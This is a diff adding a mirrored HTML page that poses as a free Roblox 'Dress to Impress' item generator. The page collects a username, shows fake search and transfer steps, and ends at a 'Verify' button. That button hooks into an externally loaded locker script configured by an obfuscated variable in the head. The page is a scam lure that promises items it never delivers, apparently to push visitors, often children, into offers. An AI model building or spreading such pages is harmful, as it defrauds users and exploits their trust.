@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from dressvip.pages.dev/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 11 Dec 2024 19:32:32 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>Dress to Impress</title>
+  <link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/css/bootstrap.min.css">
+    <link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+      <style>
+        @font-face {
+          font-family: 'Refinery 95';
+          src: url('assets/fonts/refinery-95-regular.ttf') format('truetype');
+        }
+        
+        body {
+          background-image: radial-gradient(circle, rgba(204, 25, 31, 1) 0%, rgb(115, 1, 7) 100%);
+          background-repeat: no-repeat;
+          background-size: cover;
+          background-position: center;
+          background-attachment: fixed;
+          font-family: 'Refinery 95';
+          color: #fff;
+          font-weight: bold;
+        }
+        
+        .xload .top-img {
+          position: fixed;
+          top: 0;
+          left: 0;
+          right: 0;
+          width: 100%;
+          z-index: 88;
+        }
+        
+        .xload .bottom-img {
+          position: fixed;
+          bottom: 0;
+          left: 0;
+          right: 0;
+          width: 100%;
+          z-index: 88;
+        }
+        
+        #particles-js {
+          position: fixed;
+          width: 100%;
+          height: 100%;
+          z-index: -888;
+        }
+        
+        .logo {
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          margin-top: 80px;
+        }
+        
+        .xload .logo img {
+          width: 290px;
+          margin: 25px auto;
+        }
+        
+        .container-md {
+          padding: 0 50px;
+        }
+        
+        .xload .item {
+          position: relative;
+          margin: 10px 0;
+          text-align: center;
+        }
+        
+        .xload .item.active img {
+          box-shadow: 0px 0px 20px 4px rgb(215, 179, 2);
+        }
+        
+        .item .cap {
+          position: absolute;
+          left: 50%;
+          transform: translate(-50%);
+          display: none;
+        }
+        
+        .xload .item img {
+          width: 100%;
+          border-radius: 50%;
+        }
+        
+        .xload .item .title {
+          margin-top: 9px;
+          margin-bottom: 10px;
+          text-shadow: 2px 2px 9px #c8be00;
+        }
+        
+        
+        .xload .folding {
+          margin: 20px auto;
+          width: 70px;
+          height: 70px;
+          position: relative;
+          transform: rotateZ(45deg);
+        }
+        
+        .xload .square {
+          position: absolute;
+          top: 30%;
+          right: 30%;
+          width: 30px;
+          height: 30px;
+          background-color: crimson;
+          transform: rotateZ(87deg);
+        }
+        
+        .folding .sk-cube {
+          float: left;
+          width: 50%;
+          height: 50%;
+          position: relative;
+          transform: scale(1.1);
+        }
+        
+        .folding .sk-cube:before {
+          content: "";
+          position: absolute;
+          top: 0;
+          left: 0;
+          width: 100%;
+          height: 100%;
+          background-color: #fff;
+          animation: sk-foldCubeAngle 2.4s infinite linear both;
+          transform-origin: 100% 100%;
+        }
+        
+        .folding .sk-cube2 {
+          transform: scale(1.1) rotateZ(90deg);
+        }
+        
+        .folding .sk-cube3 {
+          transform: scale(1.1) rotateZ(180deg);
+        }
+        
+        .folding .sk-cube4 {
+          transform: scale(1.1) rotateZ(270deg);
+        }
+        
+        .folding .sk-cube2:before {
+          animation-delay: 0.3s;
+        }
+        
+        .folding .sk-cube3:before {
+          animation-delay: 0.6s;
+        }
+        
+        .folding .sk-cube4:before {
+          animation-delay: 0.9s;
+        }
+        
+        @keyframes sk-foldCubeAngle {
+          
+          0%,
+          10% {
+            transform: perspective(140px) rotateX(-180deg);
+            opacity: 0;
+          }
+          
+          25%,
+          75% {
+            transform: perspective(140px) rotateX(0deg);
+            opacity: 1;
+          }
+          
+          90%,
+          100% {
+            transform: perspective(140px) rotateY(180deg);
+            opacity: 0;
+          }
+        }
+        
+        
+        .xload .mode {
+          background-color: rgba(0, 0, 0, .7);
+          position: fixed;
+          top: 0;
+          left: 0;
+          right: 0;
+          bottom: 0;
+          z-index: 8888;
+          display: flex;
+          justify-content: center;
+          padding: 60px 20px;
+        }
+        
+        .xload .mode-1 {
+          background-image: url(assets/img/background.jpg);
+          background-repeat: no-repeat;
+          background-position: center;
+          background-size: cover;
+          max-width: 450px;
+          padding: 20px;
+          z-index: 777;
+          border-radius: 6px;
+          border: 3px solid #eecc9f;
+          right: 20px;
+          left: 20px;
+          position: absolute;
+          margin: 0 auto;
+        }
+        
+        .mode-1 .cap {
+          position: absolute;
+          width: 80px;
+          right: -20px;
+          top: -56px;
+          transform: rotate(13deg);
+        }
+        
+        .mode-1 .can {
+          width: 30px;
+          position: absolute;
+        }
+        
+        .mode-1 .can-1 {
+          left: -10px;
+          top: -10px;
+          transform: rotate(-45deg);
+        }
+        
+        .mode-1 .can-2 {
+          left: -10px;
+          bottom: -10px;
+          transform: rotate(-125deg);
+        }
+        
+        .mode-1 .can-3 {
+          right: -10px;
+          bottom: -10px;
+          transform: rotate(125deg);
+        }
+        
+        .mode-1 .logo {
+          width: 75%;
+          margin: 0 auto;
+        }
+        
+        
+        .xload .message {
+          position: fixed;
+          bottom: 65px;
+          left: 15px;
+          background-color: red;
+          display: flex;
+          font-size: .8rem;
+          align-items: center;
+          padding: 10px 20px;
+          border-radius: 6px;
+          background-image: url(assets/img/background-2.jpg);
+          background-repeat: no-repeat;
+          background-position: top;
+          background-size: cover;
+          border: 2px solid #eecc9f;
+          z-index: 9999;
+        }
+        
+        .xload .message .img img {
+          width: 50px;
+          background: #fff;
+          border-radius: 50%;
+          height: 50px;
+        }
+        
+        .message .img {
+          padding-right: 10px;
+        }
+        
+        .xload .message .border-img {
+          position: absolute;
+          width: 70px;
+          right: -10px;
+          top: -13px;
+        }
+        
+        .pc-img {
+          display: none;
+        }
+        
+        @media (min-width: 800px) {
+          .top-img {
+            display: none;
+          }
+          
+          .bottom-img {
+            display: none;
+          }
+          
+          .container-md {
+            max-width: 750px;
+          }
+          
+          .logo {
+            margin-top: 15px;
+          }
+          
+          .message {
+            bottom: 10px;
+          }
+          
+          .pc-img {
+            display: block;
+          }
+          
+          .pc-img-1 {
+            position: fixed;
+            left: 0px;
+            top: 0px;
+            width: 300px;
+          }
+          
+          .pc-img-2 {
+            position: fixed;
+            top: 0;
+            right: 0;
+            width: 300px;
+          }
+        }
+      </style>
+      <style type="text/css">
+        input {
+          margin-top: 20px;
+          width: 100%;
+          margin-bottom: 10px;
+          padding: 10px 20px;
+          border-radius: 30px;
+          border: 2px solid #eecc9f;
+        }
+        .btn-action {
+          display: flex;
+          justify-content: center;
+          margin-top: 20px;
+          margin-bottom: 30px;
+          user-select: none;
+        }
+        .btn-action .item-btn,
+        .btn-action .item-btn1 {
+          position: relative;
+        }
+        .xload .btn-action .item-btn img,
+        .xload .btn-action .item-btn1 img {
+          width: 180px;
+        }
+        .btn-action .item-btn .text,
+        .btn-action .item-btn1 .text1 {
+          position: absolute;
+          left: 50%;
+          transform: translateX(-50%);
+          bottom: 17px;
+          font-size: 1.3rem;
+          white-space: nowrap;
+          text-transform: uppercase;
+        }
+        .xload .step {
+          text-align: center;
+        }
+        .xload .heart {
+          position: absolute;
+          left: 50%;
+          transform: translateX(-50%);
+          bottom: -40px;
+        }
+        .heart .txt {
+          position: absolute;
+          left: 50%;
+          transform: translateX(-50%);
+          bottom: 20px;
+          z-index: 8888;
+          font-size: 9rem;
+        }
+        .xload .heart img {
+          width: 75px;
+        }
+        .user-error {
+          color: rgb(240, 236, 18);
+          font-size: .8rem;
+        }
+        .xload .avatar {
+          width: 90px;
+          height: 90px;
+          border-radius: 50%;
+          background-color: #fff;
+          margin-bottom: 8px;
+        }
+      </style>
+      <script src="../ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+      <script src="../cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+      <script defer src="assets/js/script.js"></script>
+      
+      <!-- Google tag (gtag.js) -->
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-MVY9VH6ZCH"></script>
+      <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+        
+        gtag('config', 'G-MJQYFWQ155');
+      </script>
+      
+      <script type="text/javascript">
+          var xnbem_Mql_rPSivc={"it":4407303,"key":"33b2a"};
+      </script>
+      <script src="../d2jiwo73gmsmk.cloudfront.net/4b5e08a.js"></script>
+      
+</head>
+
+<body class="xload">
+  <img class="top-img" src="assets/img/mobile-top.png" alt="">
+  <img class="bottom-img" src="assets/img/mobile-bottom.png" alt="">
+  <img class="pc-img pc-img-1" src="assets/img/pc-top-left.png" alt="">
+  <img class="pc-img pc-img-2" src="assets/img/pc-top-right.png" alt="">
+
+  <div id="particles-js"></div>
+  <audio src="assets/audio/selection.mp3" controls="" id="selection" class="d-none"></audio>
+
+  <div class="claimed"></div>
+
+  <div class="mode d-none" id="steps">
+
+    <div class="mode-1 animate__animated animate__bounceIn">
+      <img src="assets/img/cap.png" alt="" class="cap">
+      <img src="assets/img/christmas-candy-cane.png" alt="" class="can can-1">
+      <img src="assets/img/christmas-candy-cane.png" alt="" class="can can-2">
+      <img src="assets/img/christmas-candy-cane.png" alt="" class="can can-3">
+      <img src="assets/img/logo.png" alt="" class="logo">
+
+      <div class="step" id="step-1">
+        <input type="text" placeholder="Enter Your Username" id="username">
+        <div class="user-error d-none">Plase enter correct useraneme </div>
+        <div class="btn-action">
+          <div class="item-btn">
+            <img src="assets/img/button.png" alt="">
+            <div class="text user-search">Next Step</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="step animate__animated animate__bounceIn d-none" id="step-2">
+        <br>
+        <div class="folding">
+          <div class="sk-cube1 sk-cube"></div>
+          <div class="sk-cube2 sk-cube"></div>
+          <div class="sk-cube4 sk-cube"></div>
+          <div class="sk-cube3 sk-cube"></div>
+          <div class="square"></div>
+        </div>
+        <div class="searching mb-4 mt-3">Searching for <span class="username"></span></div>
+      </div>
+
+      <div class="step animate__animated animate__bounceIn d-none" id="step-3">
+        <br>
+        <div class="user">
+          <img class="avatar" src="#" alt="">
+          <div class="userinfo">@<span class="username"></span></div>
+        </div>
+        <div class="btn-action">
+          <div class="item-btn">
+            <img src="assets/img/button.png" alt="">
+            <div class="text continue">Continue</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="step animate__animated animate__bounceIn d-none" id="step-4">
+        <br>
+        <div class="loading">
+          <div class="folding">
+            <div class="sk-cube1 sk-cube"></div>
+            <div class="sk-cube2 sk-cube"></div>
+            <div class="sk-cube4 sk-cube"></div>
+            <div class="sk-cube3 sk-cube"></div>
+            <div class="square"></div>
+          </div>
+        </div>
+        <img src="assets/img/robot.png" alt="" class="img-robot d-none">
+        <div class="searching mb-4 mt-2">Transferring <span class="item-text"></span> to <span class="username"></span></div>
+        <div class="action d-none">
+          <div class="btn-action" style="margin-bottom: -55px;">
+            <div class="item-btn1">
+              <img src="assets/img/button.png" alt="">
+              <div class="text1 " onclick="_HW()">Verify</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="heart">
+        <img src="assets/img/heart.png" alt="">
+      </div>
+    </div>
+  </div>
+
+  <div class="logo">
+    <img src="assets/img/logo.png" alt="">
+  </div>
+
+  <div class="container-md">
+    <p class="text-center">Select an item you wish to generate to your Roblox account:</p>
+
+    <div class="row">
+
+      <div class="col-6 col-md-3">
+        <div class="item">
+          <div class="img"><img class="active" src="assets/img/makeup.webp" alt=""></div>
+          <div class="title">Custom Makeup</div>
+        </div>
+      </div>
+
+      <div class="col-6 col-md-3">
+        <div class="item">
+          <div class="img"><img src="assets/img/vip.png" alt=""></div>
+          <div class="title">VIP Access</div>
+        </div>
+      </div>
+
+      <div class="col-6 col-md-3">
+        <div class="item">
+          <div class="img"><img src="assets/img/x2money.png" alt=""></div>
+          <div class="title">x2 money</div>
+        </div>
+      </div>
+
+      <div class="col-6 col-md-3">
+        <div class="item">
+          <div class="img"><img src="assets/img/itemlimit.png" alt=""></div>
+          <div class="title">+6 Item Limit</div>
+        </div>
+      </div>
+
+      <div class="col-6 col-md-3">
+        <div class="item">
+          <div class="img"><img src="assets/img/rainbow.png" alt=""></div>
+          <div class="title">Rainbow Skin</div>
+        </div>
+      </div>
+
+      <div class="col-6 col-md-3">
+        <div class="item">
+          <div class="img"><img src="assets/img/walk.webp" alt=""></div>
+          <div class="title">Fast Walk</div>
+        </div>
+      </div>
+
+      <div class="col-6 col-md-3">
+        <div class="item">
+          <div class="img"><img src="assets/img/topmodel.png" alt=""></div>
+          <div class="title">Top Model Rank</div>
+        </div>
+      </div>
+
+      <div class="col-6 col-md-3">
+        <div class="item">
+          <div class="img"><img src="assets/img/diva.png" alt=""></div>
+          <div class="title">Runway Diva Rank</div>
+        </div>
+      </div>
+
+      <div class="col-6 col-md-3">
+        <div class="item">
+          <div class="img"><img src="assets/img/money.webp" alt=""></div>
+          <div class="title">35,000 Tokens</div>
+        </div>
+      </div>
+
+      <div class="col-6 col-md-3">
+        <div class="item">
+          <div class="img"><img src="assets/img/luxury.webp" alt=""></div>
+          <div class="title">Luxury Dress</div>
+        </div>
+      </div>
+
+      <div class="col-6 col-md-3">
+        <div class="item">
+          <div class="img"><img src="assets/img/moon.png" alt=""></div>
+          <div class="title">Moongazer Girl Set</div>
+        </div>
+      </div>
+
+      <div class="col-6 col-md-3">
+        <div class="item">
+          <div class="img"><img src="assets/img/Futuristi.webp" alt=""></div>
+          <div class="title">Futuristic Suit</div>
+        </div>
+      </div>
+
+      <div class="col-6 col-md-3">
+        <div class="item">
+          <div class="img"><img src="assets/img/denim.webp" alt=""></div>
+          <div class="title">Denim Bag</div>
+        </div>
+      </div>
+
+      <div class="col-6 col-md-3">
+        <div class="item">
+          <div class="img"><img src="assets/img/french.png" alt=""></div>
+          <div class="title">French Luxury Bag</div>
+        </div>
+      </div>
+
+      <div class="col-6 col-md-3">
+        <div class="item">
+          <div class="img"><img src="assets/img/rich.png" alt=""></div>
+          <div class="title">Rich Girl Bag</div>
+        </div>
+      </div>
+
+    </div>
+
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+  </div>
+</body>
+
+
+<!-- Mirrored from dressvip.pages.dev/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 11 Dec 2024 19:32:41 GMT -->
+</html>
